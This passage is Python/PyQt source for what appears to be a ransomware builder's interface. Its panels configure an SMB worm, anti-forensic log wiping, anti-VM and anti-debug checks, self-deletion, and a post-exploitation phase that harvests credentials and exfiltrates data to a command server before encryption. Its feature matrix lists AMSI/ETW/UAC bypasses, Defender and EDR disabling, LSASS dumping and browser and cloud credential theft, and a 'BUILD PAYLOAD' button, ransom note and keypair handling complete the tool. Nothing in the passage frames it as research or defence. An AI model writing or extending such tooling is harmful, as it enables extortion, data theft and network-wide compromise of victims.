        self.byovd_defender_cb.setStyleSheet("color: #cccccc; font-size: 8pt;")
        row2.addWidget(self.byovd_defender_cb)
        row2.addStretch()
        byovd_layout.addLayout(row2)

        byovd_group.setLayout(byovd_layout)
        layout.addWidget(byovd_group)

        # ═══════════════ SMB WORM ═══════════════
        smb_group = QGroupBox("🌐 SMB Worm")
        smb_group.setStyleSheet(self._group_style("#ff00ff"))
        smb_layout = QVBoxLayout()
        smb_layout.setSpacing(3)
        smb_layout.setContentsMargins(6, 10, 6, 4)

        smb_row1 = QHBoxLayout()
        self.smb_spread_cb = QCheckBox("Enable")
        self.smb_spread_cb.setChecked(True)
        self.smb_spread_cb.setStyleSheet(
            "color: #ff66ff; font-size: 9pt; font-weight: bold;"
        )
        smb_row1.addWidget(self.smb_spread_cb)

        self.smb_persist_cb = QCheckBox("Persist")
        self.smb_persist_cb.setChecked(True)
        self.smb_persist_cb.setStyleSheet("color: #cccccc; font-size: 8pt;")
        smb_row1.addWidget(self.smb_persist_cb)

        self.smb_self_exec_cb = QCheckBox("Exec")
        self.smb_self_exec_cb.setChecked(True)
        self.smb_self_exec_cb.setStyleSheet("color: #cccccc; font-size: 8pt;")
        smb_row1.addWidget(self.smb_self_exec_cb)
        smb_row1.addStretch()
        smb_layout.addLayout(smb_row1)

        smb_row2 = QHBoxLayout()
        smb_row2.setSpacing(4)
        smb_row2.addWidget(QLabel("Subnet:"))
        self.smb_subnets_input = QLineEdit()
        self.smb_subnets_input.setText("auto")
        self.smb_subnets_input.setFixedHeight(22)
        self.smb_subnets_input.setStyleSheet(self._input_style())
        smb_row2.addWidget(self.smb_subnets_input, 1)

        smb_row2.addWidget(QLabel("Max:"))
        self.smb_max_hosts_spin = QSpinBox()
        self.smb_max_hosts_spin.setRange(1, 254)
        self.smb_max_hosts_spin.setValue(50)
        self.smb_max_hosts_spin.setFixedHeight(22)
        self.smb_max_hosts_spin.setStyleSheet(self._input_style())
        self.smb_max_hosts_spin.setMaximumWidth(60)
        smb_row2.addWidget(self.smb_max_hosts_spin)
        smb_layout.addLayout(smb_row2)

        smb_group.setLayout(smb_layout)
        layout.addWidget(smb_group)

        # ═══════════════ ANTI-FORENSIC ═══════════════
        anti_group = QGroupBox("🧹 Anti-Forensic")
        anti_group.setStyleSheet(self._group_style("#ff3333"))
        anti_layout = QVBoxLayout()
        anti_layout.setSpacing(3)
        anti_layout.setContentsMargins(6, 10, 6, 4)

        anti_row1 = QHBoxLayout()
        anti_row1.setSpacing(8)
        self.anti_vm_cb = QCheckBox("Anti-VM")
        self.anti_vm_cb.setChecked(True)
        self.anti_vm_cb.setStyleSheet("color: #cccccc; font-size: 8pt;")
        anti_row1.addWidget(self.anti_vm_cb)

        self.anti_debug_cb = QCheckBox("Anti-Debug")
        self.anti_debug_cb.setChecked(True)
        self.anti_debug_cb.setStyleSheet("color: #cccccc; font-size: 8pt;")
        anti_row1.addWidget(self.anti_debug_cb)

        self.anti_forensic_cb = QCheckBox("Wipe Logs")
        self.anti_forensic_cb.setChecked(True)
        self.anti_forensic_cb.setStyleSheet("color: #cccccc; font-size: 8pt;")
        anti_row1.addWidget(self.anti_forensic_cb)

        self.anti_recovery_cb = QCheckBox("Anti-Recovery")
        self.anti_recovery_cb.setChecked(True)
        self.anti_recovery_cb.setStyleSheet("color: #cccccc; font-size: 8pt;")
        anti_row1.addWidget(self.anti_recovery_cb)
        anti_row1.addStretch()
        anti_layout.addLayout(anti_row1)

        anti_row2 = QHBoxLayout()
        anti_row2.setSpacing(8)
        self.self_delete_cb = QCheckBox("Self-Delete")
        self.self_delete_cb.setChecked(True)
        self.self_delete_cb.setStyleSheet("color: #cccccc; font-size: 8pt;")
        anti_row2.addWidget(self.self_delete_cb)

        self.polymorphic_cb = QCheckBox("Polymorphic")
        self.polymorphic_cb.setChecked(True)
        self.polymorphic_cb.setStyleSheet("color: #cccccc; font-size: 8pt;")
        anti_row2.addWidget(self.polymorphic_cb)

        self.triple_pass_cb = QCheckBox("Triple-Pass Delete")
        self.triple_pass_cb.setChecked(True)
        self.triple_pass_cb.setStyleSheet("color: #cccccc; font-size: 8pt;")
        anti_row2.addWidget(self.triple_pass_cb)

        self.wallpaper_cb = QCheckBox("Wallpaper")
        self.wallpaper_cb.setChecked(True)
        self.wallpaper_cb.setStyleSheet("color: #cccccc; font-size: 8pt;")
        anti_row2.addWidget(self.wallpaper_cb)
        anti_row2.addStretch()
        anti_layout.addLayout(anti_row2)

        anti_group.setLayout(anti_layout)
        layout.addWidget(anti_group)

        # ═══════════════ DESKTOP ICONS ═══════════════
        icons_group = QGroupBox("🖼️ Desktop Icon Replacement")
        icons_group.setStyleSheet(self._group_style("#ff00ff"))
        icons_layout = QVBoxLayout()
        icons_layout.setSpacing(4)
        icons_layout.setContentsMargins(6, 10, 6, 4)

        self.change_icons_cb = QCheckBox("Replace desktop icons on encrypt")
        self.change_icons_cb.setChecked(False)
        self.change_icons_cb.setStyleSheet(
            "color: #ff66ff; font-size: 9pt; font-weight: bold;"
        )
        icons_layout.addWidget(self.change_icons_cb)

        icon_row = QHBoxLayout()
        icon_row.setSpacing(4)
        icon_lbl = QLabel("Icon URL:")
        icon_lbl.setStyleSheet("color: #cccccc; font-size: 9pt;")
        icon_row.addWidget(icon_lbl)

        self.icon_url_input = QLineEdit()
        self.icon_url_input.setPlaceholderText(
            "https://example.com/ransom.png (or local path)"
        )
        self.icon_url_input.setFixedHeight(22)
        self.icon_url_input.setStyleSheet(self._input_style())
        icon_row.addWidget(self.icon_url_input, 1)

        self.icon_browse_btn2 = QPushButton("...")
        self.icon_browse_btn2.setFixedSize(24, 22)
        self.icon_browse_btn2.setStyleSheet(self._browse_btn_style())
        self.icon_browse_btn2.clicked.connect(self._browse_ransom_icon)
        icon_row.addWidget(self.icon_browse_btn2)

        icons_layout.addLayout(icon_row)

        icon_warn = QLabel(
            "⚠ Replaces ALL desktop shortcuts icons + folder icons + drive icons. "
            "Restored automatically on decrypt."
        )
        icon_warn.setStyleSheet(
            "color: #ffaa00; font-size: 8pt; padding: 4px; "
            "background: rgba(255, 170, 0, 0.05); border-radius: 3px;"
        )
        icon_warn.setWordWrap(True)
        icons_layout.addWidget(icon_warn)

        icons_group.setLayout(icons_layout)
        layout.addWidget(icons_group)

        # ═══════════════ POST-EXPLOITATION ═══════════════
        postex_group = QGroupBox("🎯 Post-Exploitation (Before Encrypt)")
        postex_group.setStyleSheet(self._group_style("#00ffff"))
        postex_layout = QVBoxLayout()
        postex_layout.setSpacing(4)
        postex_layout.setContentsMargins(8, 12, 8, 6)

        self.postex_enabled_cb = QCheckBox("Enable post-exploitation phase")
        self.postex_enabled_cb.setChecked(True)
        self.postex_enabled_cb.setStyleSheet(
            "color: #00ffff; font-size: 9pt; font-weight: bold;"
        )
        postex_layout.addWidget(self.postex_enabled_cb)

        # Actions
        actions_row = QHBoxLayout()
        actions_row.setSpacing(8)
        actions_row.addWidget(QLabel("Actions:"))

        self.postex_creds_cb = QCheckBox("Creds")
        self.postex_creds_cb.setChecked(True)
        self.postex_creds_cb.setStyleSheet("color: #cccccc; font-size: 8pt;")
        actions_row.addWidget(self.postex_creds_cb)

        self.postex_discovery_cb = QCheckBox("Discovery")
        self.postex_discovery_cb.setChecked(True)
        self.postex_discovery_cb.setStyleSheet("color: #cccccc; font-size: 8pt;")
        actions_row.addWidget(self.postex_discovery_cb)

        self.postex_exfil_cb = QCheckBox("Exfil")
        self.postex_exfil_cb.setChecked(True)
        self.postex_exfil_cb.setStyleSheet("color: #cccccc; font-size: 8pt;")
        actions_row.addWidget(self.postex_exfil_cb)

        actions_row.addStretch()
        postex_layout.addLayout(actions_row)

        # Exfil config
        exfil_row = QHBoxLayout()
        exfil_row.setSpacing(4)
        exfil_row.addWidget(QLabel("Exfil Method:"))

        self.postex_exfil_method_combo = QComboBox()
        self.postex_exfil_method_combo.addItems(
            ["c2", "http", "ftp", "sftp", "mega", "s3"]
        )
        self.postex_exfil_method_combo.setFixedHeight(22)
        self.postex_exfil_method_combo.setStyleSheet(self._combo_style())
        exfil_row.addWidget(self.postex_exfil_method_combo)

        exfil_row.addWidget(QLabel("Max MB:"))
        self.postex_max_mb_spin = QSpinBox()
        self.postex_max_mb_spin.setRange(10, 10000)
        self.postex_max_mb_spin.setValue(2000)
        self.postex_max_mb_spin.setFixedHeight(22)
        self.postex_max_mb_spin.setStyleSheet(self._input_style())
        self.postex_max_mb_spin.setMaximumWidth(80)
        exfil_row.addWidget(self.postex_max_mb_spin)

        exfil_row.addStretch()
        postex_layout.addLayout(exfil_row)

        # Categories
        cats_row = QHBoxLayout()
        cats_row.setSpacing(4)
        cats_row.addWidget(QLabel("Categories:"))
        self.postex_categories_input = QLineEdit()
        self.postex_categories_input.setText("all")
        self.postex_categories_input.setPlaceholderText(
            "all|financial|customer|source|legal|hr|email|credential|database"
        )
        self.postex_categories_input.setFixedHeight(22)
        self.postex_categories_input.setStyleSheet(self._input_style())
        cats_row.addWidget(self.postex_categories_input, 1)
        postex_layout.addLayout(cats_row)

        # Info
        postex_info = QLabel(
            "⚠ Credentials + discovery + exfil executed BEFORE encryption. "
            "Results sent to C2 → view in Web Panel."
        )
        postex_info.setStyleSheet(
            "color: #00ffff; font-size: 8pt; padding: 4px; "
            "background: rgba(0, 255, 255, 0.05); border-radius: 3px;"
        )
        postex_info.setWordWrap(True)
        postex_layout.addWidget(postex_info)

        postex_group.setLayout(postex_layout)
        layout.addWidget(postex_group)

        # ═══════════════ RANSOM GUI ═══════════════
        gui_group = QGroupBox("🖥️ Ransom GUI")
        gui_group.setStyleSheet(self._group_style("#00ffff"))
        gui_layout = QVBoxLayout()
        gui_layout.setSpacing(3)
        gui_layout.setContentsMargins(6, 10, 6, 4)

        self.gui_mode_cb = QCheckBox("Show ransom GUI after encryption")
        self.gui_mode_cb.setChecked(True)
        self.gui_mode_cb.setStyleSheet(
            "color: #00ffff; font-size: 9pt; font-weight: bold;"
        )
        gui_layout.addWidget(self.gui_mode_cb)

        gui_group.setLayout(gui_layout)
        layout.addWidget(gui_group)

        # ═══════════════ RANSOM NOTE ═══════════════
        note_group = QGroupBox("📝 Ransom Note")
        note_group.setStyleSheet(self._group_style("#ff79c6"))
        note_layout = QVBoxLayout()
        note_layout.setSpacing(2)
        note_layout.setContentsMargins(6, 10, 6, 4)

        self.note_input = QTextEdit()
        self.note_input.setPlaceholderText("Ransom note content...")
        self.note_input.setMaximumHeight(60)
        self.note_input.setStyleSheet(self._textarea_style())
        note_layout.addWidget(self.note_input)

        note_group.setLayout(note_layout)
        layout.addWidget(note_group)

        layout.addStretch()

        scroll.setWidget(panel)
        return scroll

    # ═══════════════════════════════════════════════════════════════
    # OUTPUT PANEL (RIGHT)
    # ═══════════════════════════════════════════════════════════════

    def _build_output_panel(self):
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(4)
        layout.setContentsMargins(3, 3, 3, 3)

        console_label = QLabel("📟 Build Console")
        console_label.setStyleSheet(
            "font-weight: bold; color: #00ff00; font-size: 10pt;"
        )
        layout.addWidget(console_label)

        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setFont(QFont("Consolas", 9))
        self.output_text.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 3px;
                padding: 6px;
                font-family: 'Consolas', monospace;
                font-size: 9pt;
            }
        """)
        layout.addWidget(self.output_text, 3)

        # ═══════════════ KEY INFO PANEL ═══════════════
        key_info_group = QGroupBox("🔑 Generated Keypair Info")
        key_info_group.setStyleSheet("""
            QGroupBox {
                color: #ffff00;
                border: 2px solid #ffff00;
                border-radius: 5px;
                margin-top: 6px;
                padding-top: 12px;
                font-weight: bold;
                font-size: 10pt;
                background: #0a0a0a;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 8px;
                color: #ffff00;
                background: #0a0a0a;
                font-size: 10pt;
            }
        """)
        key_info_layout = QVBoxLayout()
        key_info_layout.setSpacing(4)
        key_info_layout.setContentsMargins(8, 6, 8, 8)

        victim_row = QHBoxLayout()
        victim_row.setSpacing(8)
        victim_label = QLabel("Victim ID:")
        victim_label.setStyleSheet("color: #888888; font-size: 9pt; min-width: 90px;")
        victim_row.addWidget(victim_label)

        self.victim_id_display = QLineEdit()
        self.victim_id_display.setReadOnly(True)
        self.victim_id_display.setPlaceholderText("(will appear after build)")
        self.victim_id_display.setFont(QFont("Consolas", 9))
        self.victim_id_display.setStyleSheet("""
            QLineEdit {
                background: #0d1117;
                color: #00ffff;
                border: 1px solid #00ffff;
                border-radius: 3px;
                padding: 4px 8px;
                font-family: 'Consolas', monospace;
                font-weight: bold;
            }
        """)
        victim_row.addWidget(self.victim_id_display, 1)

        copy_victim_btn = QPushButton("📋")
        copy_victim_btn.setFixedSize(28, 26)
        copy_victim_btn.setStyleSheet(self._action_btn_style("#1f6feb", "#388bfd"))
        copy_victim_btn.setToolTip("Copy Victim ID")
        copy_victim_btn.clicked.connect(
            lambda: self._copy_to_clipboard(self.victim_id_display.text(), "Victim ID")
        )
        victim_row.addWidget(copy_victim_btn)
        key_info_layout.addLayout(victim_row)

        fp_row = QHBoxLayout()
        fp_row.setSpacing(8)
        fp_label = QLabel("Key Fingerprint:")
        fp_label.setStyleSheet("color: #888888; font-size: 9pt; min-width: 90px;")
        fp_row.addWidget(fp_label)

        self.fingerprint_display = QLineEdit()
        self.fingerprint_display.setReadOnly(True)
        self.fingerprint_display.setPlaceholderText("(will appear after build)")
        self.fingerprint_display.setFont(QFont("Consolas", 9))
        self.fingerprint_display.setStyleSheet("""
            QLineEdit {
                background: #0d1117;
                color: #00ff00;
                border: 1px solid #00ff00;
                border-radius: 3px;
                padding: 4px 8px;
                font-family: 'Consolas', monospace;
                font-weight: bold;
            }
        """)
        fp_row.addWidget(self.fingerprint_display, 1)

        copy_fp_btn = QPushButton("📋")
        copy_fp_btn.setFixedSize(28, 26)
        copy_fp_btn.setStyleSheet(self._action_btn_style("#1f6feb", "#388bfd"))
        copy_fp_btn.setToolTip("Copy Fingerprint")
        copy_fp_btn.clicked.connect(
            lambda: self._copy_to_clipboard(
                self.fingerprint_display.text(), "Fingerprint"
            )
        )
        fp_row.addWidget(copy_fp_btn)
        key_info_layout.addLayout(fp_row)

        self.privkey_status = QLabel("❌ Private key: not generated")
        self.privkey_status.setStyleSheet(
            "color: #ff5555; font-size: 9pt; padding: 6px; "
            "background: rgba(255, 85, 85, 0.1); border-radius: 3px;"
        )
        key_info_layout.addWidget(self.privkey_status)

        warn = QLabel("⚠ SAVE PRIVATE KEY before build")
        warn.setStyleSheet(
            "color: #ffaa00; font-size: 8pt; padding: 4px; "
            "background: rgba(255, 170, 0, 0.1); border-left: 3px solid #ffaa00;"
        )
        warn.setWordWrap(True)
        key_info_layout.addWidget(warn)

        key_info_group.setLayout(key_info_layout)
        layout.addWidget(key_info_group)

        # ═══════════════ ACTION BUTTONS ═══════════════
        action_group = QGroupBox("⚡ Actions")
        action_group.setStyleSheet("""
            QGroupBox {
                color: #00ffff;
                border: 1px solid #00ffff;
                border-radius: 5px;
                margin-top: 6px;
                padding-top: 12px;
                font-weight: bold;
                font-size: 10pt;
                background: #0a0a0a;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 8px;
                color: #00ffff;
                background: #0a0a0a;
            }
        """)
        action_layout = QVBoxLayout()
        action_layout.setSpacing(4)
        action_layout.setContentsMargins(8, 6, 8, 8)

        self.build_btn = QPushButton("🚀 BUILD PAYLOAD")
        self.build_btn.setFixedHeight(30)
        self.build_btn.setStyleSheet("""
            QPushButton {
                background: #121110;
                color: white;
                font-weight: bold;
                font-size: 12pt;
                padding: 6px;
                border: 2px solid #ff5555;
                border-radius: 5px;
                font-family: 'Consolas', monospace;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 #ff5555, stop:1 #ee0000);
                border-color: #ff8888;
            }
            QPushButton:pressed { background: #aa0000; }
            QPushButton:disabled {
                background: #333333;
                color: #666666;
                border-color: #444444;
            }
        """)
        self.build_btn.clicked.connect(self._generate)
        action_layout.addWidget(self.build_btn)

        sec_row = QHBoxLayout()
        sec_row.setSpacing(4)

        self.copy_key_btn = QPushButton("📋 Copy Private Key")
        self.copy_key_btn.setFixedHeight(28)
        self.copy_key_btn.setStyleSheet(self._action_btn_style("#1f6feb", "#388bfd"))
        self.copy_key_btn.clicked.connect(self._copy_private_key)
        self.copy_key_btn.setEnabled(False)
        sec_row.addWidget(self.copy_key_btn)

        self.copy_payload_btn = QPushButton("📋 Copy Payload")
        self.copy_payload_btn.setFixedHeight(28)
        self.copy_payload_btn.setStyleSheet(
            self._action_btn_style("#1f6feb", "#388bfd")
        )
        self.copy_payload_btn.clicked.connect(self._copy_payload)
        self.copy_payload_btn.setEnabled(False)
        sec_row.addWidget(self.copy_payload_btn)

        self.open_folder_btn = QPushButton("📂 Open Folder")
        self.open_folder_btn.setFixedHeight(28)
        self.open_folder_btn.setStyleSheet(self._action_btn_style("#238636", "#2ea043"))
        self.open_folder_btn.clicked.connect(self._open_output_folder)
        sec_row.addWidget(self.open_folder_btn)

        action_layout.addLayout(sec_row)

        ctrl_row = QHBoxLayout()
        ctrl_row.setSpacing(4)

        self.stop_btn = QPushButton("⏹ Stop")
        self.stop_btn.setFixedHeight(26)
        self.stop_btn.setStyleSheet(self._action_btn_style("#a31515", "#c72e2e"))
        self.stop_btn.clicked.connect(self._stop_generation)
        self.stop_btn.setEnabled(False)
        ctrl_row.addWidget(self.stop_btn)

        self.clear_btn = QPushButton("🧹 Clear")
        self.clear_btn.setFixedHeight(26)
        self.clear_btn.setStyleSheet(self._action_btn_style("#555555", "#777777"))
        self.clear_btn.clicked.connect(self._clear_all)
        ctrl_row.addWidget(self.clear_btn)

        self.reset_btn = QPushButton("🔄 Reset")
        self.reset_btn.setFixedHeight(26)
        self.reset_btn.setStyleSheet(self._action_btn_style("#1a7f37", "#238636"))
        self.reset_btn.clicked.connect(self._reload_config)
        ctrl_row.addWidget(self.reset_btn)

        action_layout.addLayout(ctrl_row)

        action_group.setLayout(action_layout)
        layout.addWidget(action_group)

        preview_label = QLabel("📄 Payload Preview & Feature Matrix")
        preview_label.setStyleSheet(
            "font-weight: bold; color: #ffff00; font-size: 9pt; margin-top: 3px;"
        )
        layout.addWidget(preview_label)

        self.payload_text = QTextEdit()
        self.payload_text.setReadOnly(True)
        self.payload_text.setFont(QFont("Consolas", 8))
        self.payload_text.setMinimumHeight(180)
        self.payload_text.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                color: #8be9fd;
                border: 1px solid #30363d;
                border-radius: 3px;
                padding: 4px;
                font-family: 'Consolas', monospace;
                font-size: 8pt;
            }
        """)
        layout.addWidget(self.payload_text, 2)

        return panel

    # ═══════════════════════════════════════════════════════════════
    # FEATURE MATRIX HELPERS
    # ═══════════════════════════════════════════════════════════════

    def _get_feature_matrix(self):
        """
        Return dict of features included/excluded based on current UI settings.
        """
        target_os = self.target_os_combo.currentText().lower()
        include_windows = target_os in ("all", "windows")
        include_linux = target_os in ("all", "linux")
        include_macos = target_os in ("all", "macos")

        av_bypass = self.av_bypass_cb.isChecked()
        byovd = self.byovd_enabled_cb.isChecked()
        smb = self.smb_spread_cb.isChecked()
        priv_esc = True
        anti_vm = self.anti_vm_cb.isChecked()
        anti_debug = self.anti_debug_cb.isChecked()
        anti_forensic = self.anti_forensic_cb.isChecked()
        anti_recovery = self.anti_recovery_cb.isChecked()
        self_delete = self.self_delete_cb.isChecked()
        polymorphic = self.polymorphic_cb.isChecked()
        triple_pass = self.triple_pass_cb.isChecked()
        wallpaper = self.wallpaper_cb.isChecked()
        change_icons = self.change_icons_cb.isChecked()
        gui = self.gui_mode_cb.isChecked()
        post_exploit = self.postex_enabled_cb.isChecked()
        post_creds = self.postex_creds_cb.isChecked()
        post_disc = self.postex_discovery_cb.isChecked()
        post_exfil = self.postex_exfil_cb.isChecked()

        features = {
            "windows": {},
            "linux": {},
            "macos": {},
            "cross": {},
        }

        # ═══ Windows-only features ═══
        if include_windows:
            features["windows"] = {
                "UAC Bypass (cmstp/fodhelper)": av_bypass and priv_esc,
                "AMSI Bypass (patch + reflection)": av_bypass,
                "ETW Bypass (EtwEventWrite patch)": av_bypass,
                "Defender Disable": av_bypass,
                "Firewall Disable": av_bypass,
                "Credential Guard Disable": av_bypass,
                "AV/EDR Killer (taskkill + NtTerminate)": av_bypass,
                "AV Services Stop": av_bypass,
                "AV Drivers Unload": av_bypass,
                "BYOVD Escalation": byovd and priv_esc,
                "SMB Worm (spread)": smb,
                "SMB WMI/PSEXEC Exec": smb,
                "LSASS Dump": post_exploit and post_creds,
                "SAM/SECURITY Dump": post_exploit and post_creds,
                "DPAPI Harvest": post_exploit and post_creds,
                "Credential Manager": post_exploit and post_creds,
                "RDP/VNC/PuTTY/WinSCP History": post_exploit and post_creds,
            }
        else:
            features["windows"] = None

        # ═══ Linux-only features ═══
        if include_linux:
            features["linux"] = {
                "GNOME Wallpaper": wallpaper,
                "KDE Plasma Wallpaper": wallpaper,
                "XFCE Wallpaper": wallpaper,
                "Cinnamon Wallpaper": wallpaper,
                "MATE Wallpaper": wallpaper,
                "LXDE/LXQt Wallpaper": wallpaper,
                "Sway/Hyprland Wallpaper": wallpaper,
                "Universal Fallback (feh/hsetroot)": wallpaper,
                "Linux Privesc (sudo/SUID/passwd)": priv_esc,
                "Wipe /var/log/*": anti_forensic,
                "Wipe ~/.bash_history": anti_forensic,
                "Delete ~/.cache & Trash": anti_recovery,
                "Desktop Icon Change (.desktop)": change_icons,
            }
        else:
            features["linux"] = None

        # ═══ macOS-only features ═══
        if include_macos:
            features["macos"] = {
                "osascript Wallpaper": wallpaper,
                "osascript Privesc (admin prompt)": priv_esc,
                "Wipe /var/log/system.log": anti_forensic,
                "Desktop Icon Change (xattr)": change_icons,
            }
        else:
            features["macos"] = None

        # ═══ Cross-platform features ═══
        features["cross"] = {
            "Hybrid Encryption (RSA-4096 + AES-256-GCM)": True,
            "Parallel Encryption (multi-thread)": True,
            "Ransom Note (multi-location)": True,
            "Ransom GUI (Tkinter)": gui,
            "Anti-VM Detection": anti_vm,
            "Anti-Debug Detection": anti_debug,
            "Anti-Timing (random delay)": True,
            "Triple-Pass Delete": triple_pass,
            "Self-Delete": self_delete,
            "Polymorphic Helpers": polymorphic,
            "SSH Keys Harvest": post_exploit and post_creds,
            "Cloud Credentials (AWS/GCP/Azure)": post_exploit and post_creds,
            "Browser Credentials (Chrome/Firefox)": post_exploit and post_creds,
            "WiFi Passwords": post_exploit and post_creds,
            ".env Files Harvest": post_exploit and post_creds,
            "Shell History Harvest": post_exploit and post_creds,
            "Deep Discovery (users/services/shares)": post_exploit and post_disc,
            "Exfiltration (multi-channel)": post_exploit and post_exfil,
        }

        return features, target_os

    def _format_feature_matrix(self, features, target_os):
        """Format feature matrix as HTML for preview panel."""
        html = ""

        html += f"""
        <div style="background:#0d1117; padding:8px; border-radius:4px;
                    border-left:4px solid #00ffff; margin-bottom:10px;">
            <div style="color:#00ffff; font-weight:bold; font-size:11pt;">
                🎯 TARGET OS: {target_os.upper()}
            </div>
        </div>
        """

        def render_features(title, color, feat_dict):
            if feat_dict is None:
                return (
                    f'<div style="margin:6px 0; padding:6px; '
                    f"background:rgba(255,50,50,0.1); "
                    f'border-left:3px solid #ff5555;">'
                    f'<b style="color:#ff5555;">❌ {title}: DISABLED</b>'
                    f'<div style="color:#888; font-size:9pt; margin-top:3px;">'
                    f"Target OS not included"
                    f"</div></div>"
                )

            enabled = [k for k, v in feat_dict.items() if v]
            total = len(feat_dict)

            s = (
                f'<div style="margin:8px 0; padding:8px; '
                f"background:#0d1117; border-radius:4px; "
                f'border-left:4px solid {color};">'
            )
            s += f'<b style="color:{color};">{title} '
            s += f"({len(enabled)}/{total} aktif)</b>"
            s += '<div style="margin-top:6px; font-size:9pt;">'

            for k, v in feat_dict.items():
                if v:
                    s += f'<div style="color:#50fa7b; margin:2px 0;">' f"✅ {k}</div>"
                else:
                    s += f'<div style="color:#555; margin:2px 0;">' f"⬜ {k}</div>"

            s += "</div></div>"
            return s

        html += render_features("🪟 Windows Features", "#00aaff", features["windows"])
        html += render_features("🐧 Linux Features", "#ffaa00", features["linux"])
        html += render_features("🍎 macOS Features", "#ff79c6", features["macos"])
        html += render_features(
            "🌐 Cross-Platform Features", "#50fa7b", features["cross"]
        )

        total_enabled = 0
        total_features = 0
        for cat in ["windows", "linux", "macos", "cross"]:
            d = features[cat]
            if d:
                total_features += len(d)
                total_enabled += sum(1 for v in d.values() if v)

        html += f"""
        <div style="margin-top:10px; padding:8px;
                    background:rgba(0,255,255,0.05);
                    border:1px solid #00ffff; border-radius:4px;
                    text-align:center;">
            <b style="color:#00ffff; font-size:11pt;">
                📊 TOTAL: {total_enabled} / {total_features} fitur aktif
            </b>
        </div>
        """

        return html

    # ═══════════════════════════════════════════════════════════════
    # RSA KEYPAIR HANDLERS
    # ═══════════════════════════════════════════════════════════════

    def _generate_keypair(self):
        if self.keygen_worker and self.keygen_worker.isRunning():
            return

        reply = QMessageBox.question(
            self,
            "Generate RSA Keypair",
            "Generate new RSA keypair?\n\n"
            "⚠️  This will REPLACE the existing key pair.\n"
            "Ensure you have saved the old key pair.",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
        )
        if reply != QMessageBox.StandardButton.Yes:
            return

        size_text = self.rsa_size_combo.currentText()
        if "2048" in size_text:
            key_size = 2048
        elif "3072" in size_text:
            key_size = 3072
        else:
            key_size = 4096

        self.gen_keypair_btn.setEnabled(False)
        self.gen_keypair_btn.setText("⏳ Generating...")
        self.rsa_status.setText(f"⏳ Generating RSA-{key_size}...")
        self.rsa_status.setStyleSheet(
            "color: #ffaa00; font-size: 9pt; font-weight: bold; "
            "padding: 6px; background: rgba(255, 170, 0, 0.1); border-radius: 3px;"
        )

        self.keygen_worker = RSAKeygenWorker(key_size)
        self.keygen_worker.output.connect(self._append_output)
        self.keygen_worker.finished.connect(self._on_keypair_generated)
        self.keygen_worker.start()

    def _on_keypair_generated(self, success, private_pem, public_pem):
        self.gen_keypair_btn.setEnabled(True)
        self.gen_keypair_btn.setText("🔐 Generate Keypair")

        if not success:
            self.rsa_status.setText(f"❌ Generation failed")
            self.rsa_status.setStyleSheet(
                "color: #ff5555; font-size: 9pt; font-weight: bold; "
                "padding: 6px; background: rgba(255, 85, 85, 0.1); "
                "border-radius: 3px;"
            )
            QMessageBox.critical(
                self, "Error", f"RSA keypair generation failed:\n\n{public_pem}"
            )
            return

        self.rsa_private_pem = private_pem
        self.rsa_public_pem = public_pem

        import hashlib

        pub_lines = [l for l in public_pem.split("\n") if not l.startswith("-----")]
        pub_data = "".join(pub_lines).encode()
        fp = hashlib.sha256(pub_data).hexdigest()[:16]

        self.rsa_status.setText("✅ RSA keypair ready")
        self.rsa_status.setStyleSheet(
            "color: #50fa7b; font-size: 9pt; font-weight: bold; "
            "padding: 6px; background: rgba(80, 250, 123, 0.1); "
            "border-radius: 3px;"
        )

        self.rsa_fingerprint.setText(f"🔑 Fingerprint: {fp}")
        self.rsa_fingerprint.setVisible(True)

        self.save_keypair_btn.setEnabled(True)
        self.view_keys_btn.setEnabled(True)
        self.clear_keypair_btn.setEnabled(True)

        self._append_output(f"[+] Keypair ready, fingerprint: {fp}")

        QMessageBox.information(
            self,
            "Success",
            f"RSA keypair generated!\n\n"
            f"Fingerprint: {fp}\n\n"
            f"⚠️  Remember to SAVE the keypair before building!",
        )

    def _load_keypair(self):
        priv_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select PRIVATE key (.pem)",
            str(Path.home() / "lazyframework_keys"),
            "PEM Files (*.pem);;All Files (*.*)",
        )
        if not priv_path:
            return

        try:
            with open(priv_path, "r") as f:
                private_pem = f.read()
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to read private key:\n{e}")
            return

        pub_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select PUBLIC key (.pem)",
            os.path.dirname(priv_path),
            "PEM Files (*.pem);;All Files (*.*)",
        )
        if not pub_path:
            try:
                from Crypto.PublicKey import RSA

                key = RSA.import_key(private_pem)
                public_pem = key.publickey().export_key().decode()
                self._append_output("[*] Public key derived from private key")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Cannot derive public key:\n{e}")
                return
        else:
            try:
                with open(pub_path, "r") as f:
                    public_pem = f.read()
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to read public key:\n{e}")
                return

        if "-----BEGIN" not in private_pem or "-----BEGIN" not in public_pem:
            QMessageBox.critical(self, "Error", "Invalid PEM format")
            return

        self.rsa_private_pem = private_pem
        self.rsa_public_pem = public_pem

        import hashlib

        pub_lines = [l for l in public_pem.split("\n") if not l.startswith("-----")]
        pub_data = "".join(pub_lines).encode()
        fp = hashlib.sha256(pub_data).hexdigest()[:16]

        self.rsa_status.setText(f"✅ Loaded from file")
        self.rsa_status.setStyleSheet(
            "color: #50fa7b; font-size: 9pt; font-weight: bold; "
            "padding: 6px; background: rgba(80, 250, 123, 0.1); "
            "border-radius: 3px;"
        )

        self.rsa_fingerprint.setText(f"🔑 Fingerprint: {fp}")
        self.rsa_fingerprint.setVisible(True)

        self.save_keypair_btn.setEnabled(True)
        self.view_keys_btn.setEnabled(True)
        self.clear_keypair_btn.setEnabled(True)

        self._append_output(f"[+] Loaded keypair: {os.path.basename(priv_path)}")
        self._append_output(f"[+] Fingerprint: {fp}")

        QMessageBox.information(self, "Loaded", f"Keypair loaded!\n\nFingerprint: {fp}")

    def _save_keypair(self):
